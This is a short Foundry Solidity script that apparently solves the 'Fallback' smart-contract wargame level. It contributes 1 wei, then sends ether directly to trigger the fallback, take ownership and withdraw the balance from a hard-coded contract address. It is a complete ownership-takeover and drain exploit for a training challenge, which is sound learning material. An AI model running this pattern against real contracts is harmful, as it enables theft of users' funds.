// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Fallback} from "../src/Fallback.sol";
import {Script, console} from "../lib/forge-std/src/Script.sol";

contract FallbackDeploy is Script {
    Fallback public fallbcakInstance = Fallback(payable(0xFc1AbA1711b494eb702E95c65e92c2D07ba00440));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        fallbcakInstance.contribute{value: 1 wei}();
        (bool success,) = address(fallbcakInstance).call{value: 1 wei}("");
        console.log("the owner of the contract: ", fallbcakInstance.owner());
        console.log("the actual owner: ", vm.envAddress("MY_ADDRESS"));
        fallbcakInstance.withdraw();
        vm.stopBroadcast();
    }
}
